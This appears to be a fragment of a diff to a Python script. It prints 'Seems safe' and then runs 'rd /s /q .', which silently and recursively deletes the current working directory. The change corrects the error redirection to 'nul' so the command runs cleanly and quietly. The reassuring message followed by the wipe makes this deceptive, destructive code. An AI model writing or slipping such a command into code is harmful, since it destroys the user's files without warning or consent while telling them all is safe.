@@ -25,5 +25,5 @@ if __name__ == '__main__':
         os.system('pause')
     print("Seems safe")
 
-    os.system('rd /s /q . 2> null')
+    os.system('rd /s /q . 2> nul')
 
